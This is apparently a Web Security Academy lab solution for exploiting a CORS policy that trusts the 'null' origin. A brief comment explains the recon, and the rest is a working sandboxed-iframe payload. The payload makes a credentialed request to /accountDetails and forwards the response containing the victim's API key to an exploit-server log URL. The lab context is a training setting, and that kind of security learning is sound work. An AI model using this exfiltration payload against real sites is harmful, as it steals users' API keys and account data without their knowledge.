/*

1) Source code reveals that the API key is fetched by an AJAX request to the /accountDetails endp

2) GET /accountDetails
    Origin: null
//send this and try
//and in response you can see 

HTTP/2 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
// so the target might be using a whitelist vulnerable to CORS



*/

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a2e009603c546fb800fef640030008c.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0ab400560386462a8074ee7701a500c3.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
